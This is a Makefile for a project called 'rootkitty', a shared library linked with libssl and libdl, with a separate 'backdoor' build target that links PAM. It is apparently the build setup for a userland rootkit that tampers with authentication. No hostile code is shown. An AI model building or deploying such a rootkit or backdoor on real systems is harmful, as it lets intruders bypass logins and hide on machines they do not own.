CC = gcc
SRCS = src/rootkitty-lib.c 
OUT = rootkitty.so
# add -s later for a stripped binary
CFLAGS = -fPIC -shared -lssl -ldl 
DBG = $(CFLAGS) -Wall -g -O2

all:
	@echo "Compiling rootkitty... >^..^<"
	$(CC) $(SRCS) -o $(OUT) $(CFLAGS) $(LIBS)

# for debugging purposes
debug:
	@echo "Compiling rootkitty + debug...  >^..^<"
	$(CC) $(SRCS) -o $(OUT) $(DBG)

# temporary one for backdoor (will be moved to "all" later)
backdoor:
	$(CC) $(SRCS) -o $(OUT) -lpam $(CFLAGS)
